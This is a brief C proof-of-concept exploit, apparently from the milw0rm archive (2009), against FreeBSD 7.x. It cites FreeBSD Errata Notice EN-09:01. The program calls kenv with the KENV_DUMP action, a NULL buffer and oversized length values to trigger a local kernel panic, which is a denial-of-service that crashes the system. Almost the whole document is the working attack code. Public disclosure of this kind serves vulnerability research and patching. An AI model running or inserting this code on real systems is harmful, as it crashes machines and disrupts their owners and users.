/* FreeBSD 7.x local kernel panic as mentioned in Errata Notice 09:01
http://security.freebsd.org/advisories/FreeBSD-EN-09:01.kenv.asc,
kokanin@gmail */
#include <kenv.h>
#include <stdio.h>
void main(){
kenv(KENV_DUMP,NULL,123123123,123123123);
}

// milw0rm.com [2009-03-23]
